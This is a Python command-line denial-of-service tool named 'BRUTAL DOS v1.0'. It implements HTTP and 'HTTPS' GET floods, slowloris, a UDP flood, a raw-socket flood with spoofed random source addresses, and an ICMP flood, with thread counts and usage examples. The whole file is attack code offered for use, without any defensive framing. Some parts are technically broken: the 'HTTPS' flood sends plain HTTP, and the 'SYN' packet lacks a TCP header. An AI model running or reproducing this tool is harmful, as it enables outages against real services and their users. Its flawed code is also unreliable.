#!/usr/bin/env python3
"""
BRUTAL DOS v1.0 - 6 WORKING METHODS
Usage: python3 brutal.py <target> <method> <threads> [port]

Methods: http, https, slowloris, udp, syn, icmp
"""

import socket
import threading
import random
import time
import sys
import os
import struct


# Colors
G = '\033[92m'  # Green
Y = '\033[93m'  # Yellow
R = '\033[91m'  # Red
B = '\033[94m'  # Blue
W = '\033[0m'   # White

# ========== HIT COUNTER ==========
hits = 0
hits_lock = threading.Lock()

def add_hit():
    global hits
    with hits_lock:
        hits += 1
        if hits % 100 == 0:
            sys.stdout.write(f"\r{B}[✓] Hits: {hits}{W}")
            sys.stdout.flush()

# ========== ATTACK METHODS ==========

def http_flood(ip, port, threads):
    """HTTP GET flood"""
    def worker():
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((ip, port))
                req = f"GET /{random.randint(1,99999)} HTTP/1.1\r\nHost: {ip}\r\n\r\n"
                s.send(req.encode())
                s.close()
                add_hit()
            except:
                pass
    
    for _ in range(threads):
        threading.Thread(target=worker, daemon=True).start()
    print(f"{G}[+] HTTP flood started on {ip}:{port} with {threads} threads{W}")

def https_flood(ip, port, threads):
    """HTTPS flood (uses raw socket)"""
    def worker():
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((ip, port))
                req = f"GET /{random.randint(1,99999)} HTTP/1.1\r\nHost: {ip}\r\n\r\n"
                s.send(req.encode())
                s.close()
                add_hit()
            except:
                pass
    
    for _ in range(threads):
        threading.Thread(target=worker, daemon=True).start()
    print(f"{G}[+] HTTPS flood started on {ip}:{port} with {threads} threads{W}")

def slowloris(ip, port, threads):
    """Slowloris attack"""
    conns = []
    
    def create_conn():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((ip, port))
            s.send(f"GET /{random.randint(1,99999)} HTTP/1.1\r\nHost: {ip}\r\n".encode())
            conns.append(s)
            add_hit()
            return s
        except:
            return None
    
    def keeper():
        while True:
            for s in conns[:]:
                try:
                    s.send(f"X-{random.randint(1,999)}: {random.randint(1,999)}\r\n".encode())
                except:
                    conns.remove(s)
            time.sleep(10)
    
    # Start keeper
    threading.Thread(target=keeper, daemon=True).start()
    
    # Create connections
    for _ in range(threads * 5):
        threading.Thread(target=create_conn, daemon=True).start()
        time.sleep(0.1)
    
    print(f"{G}[+] Slowloris started on {ip}:{port} with {threads*5} connections{W}")

def udp_flood(ip, port, threads):
    """UDP flood"""
    def worker():
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while True:
            try:
                data = os.urandom(random.randint(64, 1024))
                s.sendto(data, (ip, port))
                add_hit()
            except:
                pass
    
    for _ in range(threads):
        threading.Thread(target=worker, daemon=True).start()
    print(f"{G}[+] UDP flood started on {ip}:{port} with {threads} threads{W}")

def syn_flood(ip, port, threads):
    """SYN flood (needs root)"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    except:
        print(f"{R}[-] SYN flood needs root! Run with sudo{W}")
        return
    
    def worker():
        while True:
            try:
                src = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                # Simple IP header
                packet = struct.pack('!BBHHHBBH4s4s', 
                                    0x45, 0, 40, 0, 0, 64, 6, 0,
                                    socket.inet_aton(src), socket.inet_aton(ip))
                s.sendto(packet, (ip, 0))
                add_hit()
            except:
                pass
    
    for _ in range(threads):
        threading.Thread(target=worker, daemon=True).start()
    print(f"{G}[+] SYN flood started on {ip} with {threads} threads{W}")

def icmp_flood(ip, threads):
    """ICMP flood (needs root)"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except:
        print(f"{R}[-] ICMP flood needs root! Run with sudo{W}")
        return
    
    def worker():
        while True:
            try:
                # ICMP echo request
                packet = struct.pack('!BBHHH', 8, 0, 0, random.randint(0,65535), 0)
                packet += os.urandom(56)
                s.sendto(packet, (ip, 0))
                add_hit()
            except:
                pass
    
    for _ in range(threads):
        threading.Thread(target=worker, daemon=True).start()
    print(f"{G}[+] ICMP flood started on {ip} with {threads} threads{W}")

# ========== STATUS THREAD ==========
def status_thread():
    """Show status every second"""
    global hits
    last_hits = 0
    while True:
        time.sleep(1)
        current = hits
        rate = current - last_hits
        last_hits = current
        sys.stdout.write(f"\r{Y}[⚡] Total: {current} | Rate: {rate}/s{W} ")
        sys.stdout.flush()

# ========== MAIN ==========
def main():
    if len(sys.argv) < 4:
        print(f"""
{B}BRUTAL DOS v1.0 - 6 WORKING METHODS{W}

{Y}Usage:{W} python3 brutal.py <target> <method> <threads> [port]

{Y}Methods:{W}
  http      - HTTP flood (port 80)
  https     - HTTPS flood (port 443)  
  slowloris - Slowloris attack (port 80)
  udp       - UDP flood (any port)
  syn       - SYN flood (needs root)
  icmp      - ICMP flood (needs root)

{Y}Examples:{W}
  python3 brutal.py 192.168.1.1 http 200
  sudo python3 brutal.py 10.0.0.1 syn 100
  python3 brutal.py example.com slowloris 50 8080
        """)
        return
    
    target = sys.argv[1]
    method = sys.argv[2].lower()
    threads = int(sys.argv[3])
    port = int(sys.argv[4]) if len(sys.argv) > 4 else (80 if method in ['http', 'slowloris'] else 443 if method == 'https' else 80)
    
    # Resolve IP
    try:
        ip = socket.gethostbyname(target)
    except:
        ip = target
    
    print(f"""
{B}========== ATTACK STARTED =========={W}
{Y}Target:{W} {target} ({ip}:{port})
{Y}Method:{W} {method.upper()}
{Y}Threads:{W} {threads}
{Y}Time:{W} {time.strftime('%H:%M:%S')}
{B}===================================={W}
    """)
    
    # Start status thread
    threading.Thread(target=status_thread, daemon=True).start()
    
    # Start attack
    if method == 'http':
        http_flood(ip, port, threads)
    elif method == 'https':
        https_flood(ip, port, threads)
    elif method == 'slowloris':
        slowloris(ip, port, threads)
    elif method == 'udp':
        udp_flood(ip, port, threads)
    elif method == 'syn':
        syn_flood(ip, port, threads)
    elif method == 'icmp':
        icmp_flood(ip, threads)
    else:
        print(f"{R}[-] Unknown method: {method}{W}")
        return
    
    # Keep running
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n\n{Y}[!] Stopped. Final hits: {hits}{W}")

if __name__ == "__main__":
    main()